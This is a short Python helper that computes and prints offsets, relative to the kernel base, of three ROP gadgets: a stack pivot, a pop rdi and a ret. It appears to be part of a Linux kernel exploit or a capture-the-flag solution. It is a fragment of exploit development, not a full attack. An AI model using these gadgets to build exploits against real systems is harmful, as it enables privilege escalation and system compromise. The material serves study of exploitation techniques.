import sys

base = 0xffffffff81000000
PIVOT = 0xffffffff814a3c7a - base # push rdx ; pop rsp ; ret 0x6600
POP_RDI = 0xffffffff8285b21a - base # mov ah, 0xfe ; pop rdi ; ret
POP_RET = 0xffffffff81000145 - base # ret

print(f"PIVOT_OFFSET: {hex(PIVOT)}")
print(f"POP_RDI_OFFSET: {hex(POP_RDI)}")
print(f"POP_RET_OFFSET: {hex(POP_RET)}")
